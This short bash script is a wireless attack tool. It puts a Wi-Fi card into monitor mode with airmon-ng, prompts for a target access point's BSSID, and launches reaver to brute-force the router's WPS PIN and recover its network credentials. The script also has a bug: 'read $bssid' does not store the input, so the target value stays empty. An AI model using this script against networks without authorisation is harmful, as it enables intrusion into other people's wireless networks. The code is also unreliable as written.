#!/bin/bash
airmon-ng start wlan0
echo -n "Insert the target bssid >"
read $bssid
reaver -i wlan0mon -b $bssid -vv
